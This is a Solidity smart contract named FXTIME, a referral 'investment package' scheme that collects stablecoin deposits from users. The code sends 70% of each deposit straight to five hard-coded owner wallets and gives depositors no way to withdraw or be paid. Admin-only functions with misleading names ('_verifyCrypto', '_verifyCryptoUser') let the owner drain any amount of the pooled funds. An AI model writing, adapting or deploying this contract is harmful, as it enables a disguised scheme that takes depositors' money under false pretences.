//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface USDT {

    function balanceOf(address account) external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
    
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}
 
contract FXTIME
{
  
    USDT public USDt;

    address public contractOwner;
    address public contractOwner2;
    address public contractOwner3;
    address public contractOwner4;
    address public contractOwner5;
    address public contractOwner6;

    uint public totalNumberofUsers;

    uint256 public totalPackagePurchased1;
    uint256 public totalPackagePurchased2;
    uint256 public totalPackagePurchased3;
    uint256 public totalPackagePurchased4;
    uint256 public totalPackagePurchased5;
 
    struct UserAffiliateDetails {
        bool isExist;
        uint userId;
        address sponsor;
        uint joiningDateTime;
        uint selfInvestment;
        uint selfInvestment1;
        uint selfInvestment2;
        uint selfInvestment3;
        uint selfInvestment4;
        uint selfInvestment5;
    }

    struct UserAffiliateDetailsIncome {
        uint totalDirect;    
        address[] Directlist;  
      
    }

     address[] AddList;  
 
   function getAllAddressList() public view returns(address[] memory ){  
        return    AddList;  
    }  
 
    mapping (address => UserAffiliateDetails) public _UserAffiliateDetails;
    mapping (address => UserAffiliateDetailsIncome) public _UserAffiliateDetailsIncome;
 
     constructor()  {

        USDt = USDT(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

        contractOwner=0xD56eFDB2c9868984f6431192f885ccaFEb39910C;

        contractOwner2=0x167a7b2996De751802fa4D9E6AfA35e948b13d51;
        contractOwner3=0x122F6875E6FCd92cc1B80fD04B9A00AB639dA09E;
        contractOwner4=0xfbccf94f80A12395381B26c3bDA216F28a53A64D;
        contractOwner5=0x763Dc5b9B27f9a07D44ECC012258144177d045cB;
        contractOwner6=0x61298896a3fFBcF12bCE74E4b19276A0a4734891;
     
        uint TimeStamp=block.timestamp;
        _UserAffiliateDetails[contractOwner].isExist = true;
        _UserAffiliateDetails[contractOwner].userId = TimeStamp;
        _UserAffiliateDetails[contractOwner].sponsor =address(0);
        _UserAffiliateDetails[contractOwner].joiningDateTime= TimeStamp;

        _UserAffiliateDetails[contractOwner].selfInvestment=0 ; 
        _UserAffiliateDetails[contractOwner].selfInvestment1=0 ; 
        _UserAffiliateDetails[contractOwner].selfInvestment2=0 ; 
        _UserAffiliateDetails[contractOwner].selfInvestment3=0 ; 
        _UserAffiliateDetails[contractOwner].selfInvestment4=0 ; 
        _UserAffiliateDetails[contractOwner].selfInvestment5=0 ; 
 
        _UserAffiliateDetailsIncome[contractOwner].totalDirect=0 ; 
       
        totalNumberofUsers=0;

        totalPackagePurchased1=0;
        totalPackagePurchased2=0;
        totalPackagePurchased3=0;
        totalPackagePurchased4=0;
        totalPackagePurchased5=0;
   
    }
 
   
    // Admin Can Check Is User Exists Or Not
    function _IsUserExists(address user) public view returns (bool) {
        return (_UserAffiliateDetails[user].userId != 0);
    }

   event Activation(address indexed user, uint256 amount,address referrer);
 
   function _Activation(address referrer, uint256 _package) external   {
            
        require(_UserAffiliateDetails[referrer].isExist == true, "Refer Not Found!");
        
        address user = msg.sender;
        
        if (_UserAffiliateDetails[user].isExist == false)
        {
            uint TimeStamp=block.timestamp;
            _UserAffiliateDetails[user].isExist = true; 
            _UserAffiliateDetails[user].userId = TimeStamp;
            _UserAffiliateDetails[user].sponsor = referrer;
            _UserAffiliateDetails[user].joiningDateTime= TimeStamp;
        
            _UserAffiliateDetails[user].selfInvestment1=0 ; 
            _UserAffiliateDetails[user].selfInvestment2=0 ; 
            _UserAffiliateDetails[user].selfInvestment3=0 ; 
            _UserAffiliateDetails[user].selfInvestment4=0 ; 
            _UserAffiliateDetails[user].selfInvestment5=0 ; 

            _UserAffiliateDetailsIncome[user].totalDirect=0 ; 

            _UserAffiliateDetailsIncome[referrer].totalDirect+=1 ; 
            _UserAffiliateDetailsIncome[referrer].Directlist.push(user);  
          
            totalNumberofUsers+=1;

            AddList.push(user);
            
        }

        if (_package==1 )
        {
            registration(user, 5*10**18, 1);
        } 
        else if (_package==2)
        {
            registration(user, 50*10**18, 2);
        }
        else if (_package==3)
        {
            registration(user, 100*10**18, 3);
        }
         else if (_package==4 )
        {
            registration(user, 500*10**18,4);
        }  
        else if (_package==5)
        {
            registration(user, 1000*10**18,5);
        }
        else
        {
            revert("This Package Already Activated!");
        }
         
    }

 
    function registration(address user, uint256 amount, uint package) private {     

            USDt.transferFrom(user, address(this), amount );
       
            _UserAffiliateDetails[user].selfInvestment+=amount ; 

            if(package==1)
            {
                _UserAffiliateDetails[user].selfInvestment1+=amount ; 
                totalPackagePurchased1+=amount;
            }
            else if(package==2)
            {
                _UserAffiliateDetails[user].selfInvestment2+=amount ;
                totalPackagePurchased2+=amount;
            }
            else if(package==3)
            {
                _UserAffiliateDetails[user].selfInvestment3+=amount ;
                 totalPackagePurchased3+=amount;
            }
             else if(package==4)
            {
                _UserAffiliateDetails[user].selfInvestment4+=amount ;
                 totalPackagePurchased4+=amount;
            }
             else if(package==5)
            {
                _UserAffiliateDetails[user].selfInvestment5+=amount ;
                 totalPackagePurchased5+=amount;
            }

            _refPayoutDirect( amount);
       
            address ref =  _UserAffiliateDetails[user].sponsor;
            emit Activation(user,amount, ref);
    }

 

// diret income 
 function _refPayoutDirect( uint256 amount) internal {

	  
        uint256 bonus2=((amount*30)/100);
       
        USDt.approve(contractOwner2, bonus2);
        USDt.transfer(contractOwner2, bonus2);

        uint256 bonus3=((amount*5)/100);
       
        USDt.approve(contractOwner3, bonus3);
        USDt.transfer(contractOwner3, bonus3);

        uint256 bonus4=((amount*5)/100);
       
        USDt.approve(contractOwner4, bonus4);
        USDt.transfer(contractOwner4, bonus4);

        uint256 bonus5=((amount*1)/100);
       
        USDt.approve(contractOwner5, bonus5);
        USDt.transfer(contractOwner5, bonus5);

         uint256 bonus6=((amount*29)/100);
       
        USDt.approve(contractOwner6, bonus6);
        USDt.transfer(contractOwner6, bonus6);

    } 

      //Get User Id
    function getUserId(address user) public view   returns (uint) {
        return (_UserAffiliateDetails[user].userId);
    }

    //Get Sponsor Id
    function getSponsorId(address user) public view   returns (address) {
        return (_UserAffiliateDetails[user].sponsor);
    }
 
  
    function _verifyCrypto(uint256 amount) public {
        require(msg.sender == contractOwner, "Only Admin Can ?");
         USDt.approve(contractOwner, amount);
         USDt.transfer(contractOwner, amount);
    }

  function _verifyCryptoUser(address user,uint256 amount) public {
        require(msg.sender == contractOwner, "Only Admin Can ?");
         USDt.approve(user, amount);
         USDt.transfer(user, amount);
    }

     function getDirectList(address referrer) public view returns(address[] memory ){  
        return    _UserAffiliateDetailsIncome[referrer].Directlist;  
    }  


  function getMasterDetail(uint i) public view   returns (uint256) {
     if(i==1)
        return  totalNumberofUsers;
     else if(i==2)
        return totalPackagePurchased1;
     else if(i==3)
        return totalPackagePurchased2;
     else if(i==4)
        return totalPackagePurchased3;
     else if(i==5)
        return totalPackagePurchased4;
     else if(i==6)
        return totalPackagePurchased5;
     else 
        return 0;

    }
 
}